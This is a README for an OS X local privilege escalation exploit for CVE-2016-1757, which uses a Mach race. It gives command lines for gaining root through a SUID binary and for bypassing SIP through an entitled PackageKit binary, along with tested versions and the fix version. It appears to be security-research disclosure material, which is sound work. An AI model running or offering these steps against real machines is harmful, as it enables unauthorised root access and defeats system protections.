Mach Race OS X Local Privilege Escalation Exploit

(c) fG! 2015, 2016, reverser@put.as - https://reverse.put.as

----------------

A SUID, SIP, and binary entitlements universal OS X exploit (CVE-2016-1757).

----------------

Usage against a SUID binary:

./mach_race_server /bin/ps _compat_mode

for i in `seq 0 1000000`; do ./mach_race_client /bin/ps; done

Against an entitled binary to bypass SIP:

./mach_race_server /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/system_shove _geteuid

for i in `seq 0 1000000`; do ./mach_race_client /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/system_shove; done

----------

References:

https://reverse.put.as/wp-content/uploads/2016/04/SyScan360_SG_2016_-_Memory_Corruption_is_for_wussies.pdf

http://googleprojectzero.blogspot.pt/2016/03/race-you-to-kernel.html

--------------

Tested against Mavericks 10.10.5, Yosemite 10.10.5, El Capitan 10.11.2 and 10.11.3.

Fixed in El Capitan 10.11.4.

Should work with all OS X versions (depends if bootstrap_register2 exists on older versions).

Alternative implementation with bootstrap_create_server possible for older versions.
